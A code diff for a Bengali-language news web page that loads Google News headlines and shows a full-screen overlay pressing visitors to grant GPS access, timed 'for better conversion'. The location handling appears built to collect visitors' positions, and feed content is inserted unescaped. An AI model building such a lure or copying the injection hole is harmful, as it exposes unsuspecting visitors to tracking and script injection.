@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Daily News</title>
+<title>বাংলা নিউজ</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
@@ -33,16 +33,10 @@ object-fit:cover;
 border-radius:6px;
 }
 
-#articlePage{display:none;}
-
-.article{background:white;padding:15px;border-radius:8px;}
-.comments{margin-top:20px;background:white;padding:10px;border-radius:8px;}
-.comment{border-bottom:1px solid #ddd;padding:5px 0;font-size:14px;}
-
 .ad{background:#ddd;padding:20px;text-align:center;margin:10px 0;}
 .footer{background:#111;color:white;text-align:center;padding:15px;margin-top:20px;}
 
-/* 🔥 SOFT GATE (blur style) */
+/* 🔥 SOFT GATE */
 #locationGate{
 position:fixed;
 top:0;left:0;
@@ -62,12 +56,7 @@ border-radius:12px;
 width:90%;
 max-width:340px;
 text-align:center;
-box-shadow:0 10px 30px rgba(0,0,0,0.2);
-animation:fadeIn 0.4s ease;
 }
-
-.gate-box h2{margin-bottom:10px;}
-.gate-box p{font-size:14px;color:#555;}
 
 .gate-box button{
 width:100%;
@@ -80,62 +69,35 @@ font-size:16px;
 margin-top:10px;
 cursor:pointer;
 }
-
-@keyframes fadeIn{
-from{opacity:0; transform:scale(0.9);}
-to{opacity:1; transform:scale(1);}
-}
 </style>
 </head>
 
 <body>
 
-<!-- 🔥 SOFT LOCATION GATE -->
+<!-- LOCATION GATE -->
 <div id="locationGate">
 <div class="gate-box">
-<h2>📍 Enable Location</h2>
-<p>আপনার এলাকার খবর ও আপডেট দেখতে location চালু করুন</p>
+<h2>📍 লোকেশন চালু করুন</h2>
+<p>আপনার এলাকার খবর দেখতে location চালু করুন</p>
 <button onclick="retryLocation()">Enable Location</button>
 </div>
 </div>
 
-<header>📰 Daily News</header>
+<header>📰 বাংলা নিউজ</header>
 
 <nav>
-<a href="#" onclick="showHome()">Home</a>
-<a href="#">World</a>
-<a href="#">Tech</a>
-<a href="#">Sports</a>
+<a href="#">হোম</a>
+<a href="#">দেশ</a>
+<a href="#">প্রযুক্তি</a>
+<a href="#">খেলা</a>
 </nav>
 
 <div class="container">
-
-<div id="homePage">
-<div class="ad">📢 Advertisement</div>
+<div class="ad">📢 বিজ্ঞাপন</div>
 <div id="newsContainer" class="grid"></div>
 </div>
 
-<div id="articlePage">
-<button onclick="showHome()">⬅ Back</button>
-
-<div class="article">
-<h2 id="title"></h2>
-<img id="image" style="width:100%;margin:10px 0;">
-<p id="content"></p>
-</div>
-
-<div class="ad">📢 Sponsored Content</div>
-
-<div class="comments">
-<h4>💬 Comments</h4>
-<div id="commentList"></div>
-</div>
-
-</div>
-
-</div>
-
-<div class="footer">© 2026 Daily News</div>
+<div class="footer">© 2026 বাংলা নিউজ</div>
 
 <script type="module">
 
@@ -249,7 +211,7 @@ time:new Date().toLocaleString()
 })
 }
 
-// 🔥 AUTO OPTIMIZED FLOW
+// AUTO DETECT
 function autoDetect(){
 navigator.geolocation.getCurrentPosition(
 pos=>{
@@ -262,7 +224,7 @@ document.getElementById("locationGate").style.display="flex"
 )
 }
 
-// retry
+// RETRY
 window.retryLocation = function(){
 navigator.geolocation.getCurrentPosition(
 pos=>{
@@ -270,60 +232,53 @@ document.getElementById("locationGate").style.display="none"
 handleGPS(pos)
 },
 ()=>{
-alert("Location still blocked")
+alert("লোকেশন চালু হয়নি")
 }
 )
 }
 
-// NEWS
-let newsData=[]
+// 🔥 BANGLA NEWS LOAD
 async function loadNews(){
-let res=await fetch("https://api.spaceflightnewsapi.net/v4/articles/")
-let data=await res.json()
-newsData=data.results
 
-let container=document.getElementById("newsContainer")
-container.innerHTML=""
+const container = document.getElementById("newsContainer")
+container.innerHTML = "লোড হচ্ছে..."
 
-newsData.slice(0,8).forEach((n,i)=>{
-let div=document.createElement("div")
-div.className="card"
-div.innerHTML=`<img src="${n.image_url}"><h4>${n.title}</h4>`
-div.onclick=()=>openArticle(i)
+try{
+
+let res = await fetch("https://api.rss2json.com/v1/api.json?rss_url=https://news.google.com/rss/search?q=বাংলাদেশ")
+let data = await res.json()
+
+container.innerHTML = ""
+
+data.items.slice(0,8).forEach(news=>{
+
+let img = "https://picsum.photos/300/200"
+
+let match = news.description.match(/src="(.*?)"/)
+if(match) img = match[1]
+
+let div = document.createElement("div")
+div.className = "card"
+
+div.innerHTML = `
+<img src="${img}">
+<h4>${news.title}</h4>
+<p>${news.description.replace(/<[^>]+>/g,"").substring(0,80)}...</p>
+`
+
+div.onclick = ()=>window.open(news.link,"_blank")
+
 container.appendChild(div)
+
 })
+
+}catch{
+container.innerHTML = "নিউজ লোড করা যায়নি"
 }
 
-// article
-window.openArticle=function(i){
-let n=newsData[i]
-document.getElementById("homePage").style.display="none"
-document.getElementById("articlePage").style.display="block"
-document.getElementById("title").innerText=n.title
-document.getElementById("image").src=n.image_url
-document.getElementById("content").innerText=n.summary
-loadComments()
 }
 
-window.showHome=function(){
-document.getElementById("homePage").style.display="block"
-document.getElementById("articlePage").style.display="none"
-}
-
-// comments
-function loadComments(){
-let arr=["Great news!","Nice update!","Very informative"]
-let list=document.getElementById("commentList")
-list.innerHTML=""
-arr.forEach(c=>{
-let d=document.createElement("div")
-d.className="comment"
-d.innerText=c
-list.appendChild(d)
-})
-}
-
-// INIT (delay for better conversion)
+// INIT
 setTimeout(()=>{autoDetect()},2000)
 loadNews()
 
